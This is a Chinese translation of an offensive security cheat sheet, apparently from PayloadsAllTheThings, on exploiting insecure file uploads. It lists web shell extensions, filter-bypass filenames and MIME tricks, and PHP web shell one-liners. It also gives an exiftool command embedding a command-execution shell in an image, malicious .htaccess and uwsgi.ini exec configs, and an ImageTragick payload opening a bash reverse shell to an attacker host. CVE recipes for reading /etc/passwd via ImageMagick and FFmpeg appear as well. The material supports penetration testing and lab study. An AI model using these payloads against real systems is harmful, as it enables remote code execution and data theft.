# 文件不安全上传

> 如果处理不当，上传的文件可能会带来重大风险。远程攻击者可以通过发送带有精心构造的文件名或 MIME 类型的 multipart/form-data POST 请求来执行任意代码。

## 概述

* [工具](#工具)
* [方法论](#方法论)
    * [默认扩展名](#默认扩展名)
    * [上传技巧](#上传技巧)
    * [文件名漏洞](#文件名漏洞)
    * [图片压缩](#图片压缩)
    * [图片元数据](#图片元数据)
    * [配置文件](#配置文件)
    * [CVE - ImageMagick](#CVE - ImageMagick)
    * [CVE - FFMpeg HLS](#CVE - FFMpeg HLS)
* [实验室](#实验室)
* [参考](#参考)

## 工具

* [almandin/fuxploiderFuxploider](https://github.com/almandin/fuxploider) - 文件上传漏洞扫描器和利用工具。
* [Burp/Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa) - Burp Proxy 的 HTTP 文件上传扫描器。
* [ZAP/FileUpload](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/) - OWASP ZAP 插件，用于查找文件上传功能中的漏洞。

## 方法论

![file-upload-mindmap.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Upload%20Insecure%20Files/Images/file-upload-mindmap.png?raw=true)

### 默认扩展名

以下是选定语言（PHP、ASP、JSP）中 Web Shell 页面的默认扩展名列表。

* PHP 服务器

    ```powershell
    .php
    .php3
    .php4
    .php5
    .php7

    # 较少知名的 PHP 扩展名
    .pht
    .phps
    .phar
    .phpt
    .pgif
    .phtml
    .phtm
    .inc
    ```

* ASP 服务器

    ```powershell
    .asp
    .aspx
    .config
    .cer 和 .asa # (IIS <= 7.5)
    shell.aspx;1.jpg # (IIS < 7.0)
    shell.soap
    ```

* JSP: `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions`
* Perl: `.pl, .pm, .cgi, .lib`
* Coldfusion: `.cfm, .cfml, .cfc, .dbm`
* Node.js: `.js, .json, .node`

其他可以被滥用以触发其他漏洞的扩展名。

* `.svg`: XXE, XSS, SSRF
* `.gif`: XSS
* `.csv`: CSV 注入
* `.xml`: XXE
* `.avi`: LFI, SSRF
* `.js` : XSS, Open Redirect
* `.zip`: RCE, DOS, LFI Gadget
* `.html` : XSS, Open Redirect

### 上传技巧

**扩展名**:

* 使用双扩展名: `.jpg.php, .png.php5`
* 使用反向双扩展名（对 Apache 配置错误有用，其中任何以 `.php` 结尾但不一定以 `.php` 结尾的文件都会执行代码）: `.php.jpg`
* 随机大小写: `.pHp, .pHP5, .PhAr`
* 空字节（对 `pathinfo()` 很有效）
    * `.php%00.gif`
    * `.php\x00.gif`
    * `.php%00.png`
    * `.php\x00.png`
    * `.php%00.jpg`
    * `.php\x00.jpg`
* 特殊字符
    * 多个点: `file.php......`，在 Windows 中，创建文件时如果文件名末尾有多个点，这些点会被移除。
    * 空白符和换行符
        * `file.php%20`
        * `file.php%0d%0a.jpg`
        * `file.php%0a`
    * 右至左覆盖（RTLO）: `name.%E2%80%AEphp.jpg` 将变为 `name.gpj.php`。
    * 斜杠: `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
    * 多个特殊字符: `file.jsp/././././.`

**文件识别**:

MIME 类型，MIME 类型（Multipurpose Internet Mail Extensions 类型）是一种标准化标识符，用于告诉浏览器、服务器和应用程序正在处理什么类型的文件或数据。它由类型和子类型组成，用斜杠分隔。将 `Content-Type : application/x-php` 或 `Content-Type : application/octet-stream` 改为 `Content-Type : image/gif` 以伪装为图像内容。

* 常见的图像内容类型：

    ```cs
    Content-Type: image/gif
    Content-Type: image/png
    Content-Type: image/jpeg
    ```

* 内容类型词表: [SecLists/web-all-content-types.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)

    ```cs
    text/php
    text/x-php
    application/php
    application/x-php
    application/x-httpd-php
    application/x-httpd-php-source
    ```

* 设置两次 `Content-Type`，一次用于不允许的类型，另一次用于允许的类型。

[Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) - 有时应用程序会根据文件的前缀字节来识别文件类型。在文件中添加/替换它们可能会欺骗应用程序。

* PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
* JPG: `\xff\xd8\xff`
* GIF: `GIF87a` 或 `GIF8;`

**文件封装**:

在 Windows 上使用 NTFS 替代数据流（ADS）。
在这种情况下，在禁止的扩展名和允许的扩展名之间插入一个冒号字符":"。结果是在服务器上创建一个空文件（例如 "`file.asax:.jpg`"）。之后可以使用其他技术编辑此文件，例如使用其短文件名。也可以使用 "::$data" 模式创建非空文件。因此，在此模式后面添加一个点字符也可能有助于绕过进一步的限制（例如 "`file.asp::$data.`"）。

**其他技术**:

PHP Web Shell 不总是包含 `<?php` 标签，这里有一些替代方案：

* 使用 PHP 脚本标签 `<script language="php">`

    ```html
    <script language="php">system("id");</script>
    ```

* `<?= 是 PHP 中用于输出值的简写语法，等同于使用 `<?php echo`。

    ```php
    <?=`$_GET[0]`?>
    ```

### 文件名漏洞

有时漏洞不是上传本身，而是上传后的处理方式。您可能希望上传带有有效负载的文件名。

* 基于时间的 SQLi 有效负载: 例如 `poc.js'(select*from(select(sleep(20)))a)+'.extension`
* LFI/路径遍历有效负载: 例如 `image.png../../../../../../../etc/passwd`
* XSS 有效负载 例如 `'"><img src=x onerror=alert(document.domain)>.extension`
* 文件遍历 例如 `../../../tmp/lol.png`
* 命令注入 例如 `; sleep 10;`

您还可以上传：

* HTML/SVG 文件以触发 XSS
* EICAR 文件以检查防病毒软件是否存在

### 图片压缩

创建包含 PHP 代码的有效图片并上传。然后使用 **本地文件包含** 来执行代码。可以使用以下命令调用 shell: `curl 'http://localhost/test.php?0=system' --data "1='ls'"`。

* 图片元数据，在元数据的注释标签内隐藏有效负载。
* 图片缩放，在压缩算法内隐藏有效负载以绕过缩放。还击败了 `getimagesize()` 和 `imagecreatefromgif()`。
    * [JPG](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l): 使用 createBulletproofJPG.py
    * [PNG](https://blog.isec.pl/injection-points-in-popular-image-formats/): 使用 createPNGwithPLTE.php
    * [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): 使用 createGIFwithGlobalColorTable.php

### 图片元数据

创建自定义图片并在其中插入 exif 标签使用 `exiftool`。可以在 [exiv2.org](https://exiv2.org/tags.html) 找到多个 exif 标签列表。

```ps1
convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

### 配置文件

如果您尝试上传到：

* PHP 服务器，请查看 [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) 技巧以执行代码。
* ASP 服务器，请查看 [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) 技巧以执行代码。
* uWSGI 服务器，请查看 [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) 技巧以执行代码。

配置文件示例

* [Apache: .htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
* [IIS: web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)
* [Python: \_\_init\_\_.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
* [WSGI: uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)

#### Apache: .htaccess

`.htaccess` 文件中的 `AddType` 指令用于指定 Apache HTTP 服务器上不同文件扩展名的 MIME（多用途互联网邮件扩展）类型。此指令帮助服务器理解如何处理不同类型文件，并在向客户端（如网络浏览器）提供文件时关联何种内容类型。

这是 `AddType` 指令的基本语法：

```ps1
AddType mime-type extension [extension ...]
```

通过上传包含以下内容的 `.htaccess` 文件来利用 `AddType` 指令。

```ps1
AddType application/x-httpd-php .rce
```

然后上传任何具有 `.rce` 扩展名的文件。

#### WSGI: uwsgi.ini

uWSGI 配置文件可以包括“魔法”变量、占位符和用精确语法定义的操作符。特别是 '@' 操作符用于 `(filename)` 形式的文件内容包含。支持多种 uWSGI 方案，包括“exec” - 从进程的标准输出读取。当解析 .ini 配置文件时，这些操作符可以被武器化以实现远程命令执行或任意文件写/读。

恶意 `uwsgi.ini` 文件示例：

```ini
[uwsgi]
; 从符号读取
foo = @(sym://uwsgi_funny_function)
; 从附加数据读取
bar = @(data://[REDACTED])
; 从 HTTP 读取
test = @(http://[REDACTED])
; 从文件描述符读取
content = @(fd://[REDACTED])
; 从进程标准输出读取
body = @(exec://whoami)
; 调用返回 char * 的函数
characters = @(call://uwsgi_func)
```

当配置文件被解析时（例如重启、崩溃或自动重新加载），负载将被执行。

#### 依赖管理器

或者，您可以上传带有自定义脚本的 JSON 文件，尝试覆盖依赖管理器配置文件。

* package.json

    ```js
    "scripts": {
        "prepare" : "/bin/touch /tmp/pwned.txt"
    }
    ```

* composer.json

    ```js
    "scripts": {
        "pre-command-run" : [
        "/bin/touch /tmp/pwned.txt"
        ]
    }
    ```

### CVE - ImageMagick

如果后端使用 ImageMagick 来调整/转换用户图片，您可以尝试利用广为人知的漏洞，如 ImageTragik。

#### CVE-2016–3714 - ImageTragik

上传以下内容并带有一个图像扩展名以利用该漏洞（ImageMagick，7.0.1-1）

* ImageTragik 示例 #1

    ```powershell
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
    pop graphic-context
    ```

* ImageTragik 示例 #3

    ```powershell
    %!PS
    userdict /setpagedevice undef
    save
    legal
    { null restore } stopped { pop } if
    { legal } stopped { pop } if
    restore
    mark /OutputFile (%pipe%id) currentdevice putdeviceprops
    ```

通过使用 `convert` 命令可以触发漏洞。

```ps1
convert shellexec.jpeg whatever.gif
```

#### CVE-2022-44268

CVE-2022-44268 是在 ImageMagick 中发现的信息泄露漏洞。攻击者可以通过制作恶意图像文件来利用此漏洞，当 ImageMagick 处理该文件时，可以从运行易受攻击版本软件的服务器本地文件系统中泄露信息。

* 生成有效载荷

    ```ps1
    apt-get install pngcrush imagemagick exiftool exiv2 -y
    pngcrush -text a "profile" "/etc/passwd" exploit.png
    ```

* 通过上传文件触发漏洞。后端可能会使用类似 `convert pngout.png pngconverted.png` 的东西。
* 下载转换后的图片并使用 `identify -verbose pngconverted.png` 检查其内容。
* 将泄露的数据转换: `python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'`

更多有效载荷在 `Picture ImageMagick/` 文件夹中。

### CVE - FFMpeg HLS

FFmpeg 是一种开源软件，用于处理音频和视频格式。您可以使用嵌入在 AVI 视频中的恶意 HLS 播放列表来读取任意文件。

1. `./gen_xbin_avi.py file://<filename> file_read.avi`
2. 上传 `file_read.avi` 到某个处理视频文件的网站
3. 在服务器端，由视频服务完成: `ffmpeg -i file_read.avi output.mp4`
4. 在视频服务中点击“播放”。
5. 如果幸运的话，您将从服务器获取 `<filename>` 的内容。

该脚本创建了一个包含 GAB2 中 HLS 播放列表的 AVI。此脚本生成的播放列表如下所示：

```ps1
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
GOD.txt
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST
```

更多有效载荷在 `CVE FFmpeg HLS/` 文件夹中。

## 实验室

* [PortSwigger - 文件上传实验室](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities)
* [Root Me - 文件上传 - 双扩展名](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)
* [Root Me - 文件上传 - MIME 类型](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)
* [Root Me - 文件上传 - 空字节](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Null-byte)
* [Root Me - 文件上传 - ZIP](https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP)
* [Root Me - 文件上传 - 多语言文件](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)

## 参考

* [A New Vector For “Dirty” Arbitrary File Write to RCE - Doyensec - Maxence Schmitt and Lorenzo Stella - 28 Feb 2023](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [Arbitrary File Upload Tricks In Java - pyn3rd - 2022-05-07](https://pyn3rd.github.io/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/)
* [Attacking Webservers Via .htaccess - Eldar Marcussen - May 17, 2011](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
* [BookFresh Tricky File Upload Bypass to RCE - Ahmed Aboul-Ela - November 29, 2014](http://web.archive.org/web/20141231210005/https://secgeek.net/bookfresh-vulnerability/)
* [Bulletproof Jpegs Generator - Damien Cauquil (@virtualabs) - April 9, 2012](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l)
* [Encoding Web Shells in PNG IDAT chunks - phil - 04-06-2012](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [File Upload - HackTricks - 20/7/2024](https://book.hacktricks.xyz/pentesting-web/file-upload)
* [File Upload restrictions bypass - Haboob Team - July 24, 2018](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
* [IIS - SOAP - Navigating The Shadows - 0xbad53c - 19/5/2024](https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)
* [Injection points in popular image formats - Daniel Kalinowski‌‌ - Nov 8, 2019](https://blog.isec.pl/injection-points-in-popular-image-formats/)
* [Insomnihack Teaser 2019 / l33t-hoster - Ian Bouchard (@Corb3nik) - January 20, 2019](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
* [Inyección de código en imágenes subidas y tratadas con PHP-GD - hackplayers - March 22, 2020](https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)
* [La PNG qui se prenait pour du PHP - Philippe Paget (@PagetPhil) - February, 23 2014](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
* [More Ghostscript Issues: Should we disable PS coders in policy.xml by default? - Tavis Ormandy - 21 Aug 2018](http://openwall.com/lists/oss-security/2018/08/21/2)
* [PHDays - Attacks on video converters:a year later - Emil Lerner, Pavel Cheremushkin - December 20, 2017](https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.p)
* [Protection from Unrestricted File Upload Vulnerability - Narendra Shinde - October 22, 2015](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
* [The .phpt File Structure - PHP Internals Book - October 18, 2017](https://www.phpinternalsbook.com/tests/phpt_file_structure.html)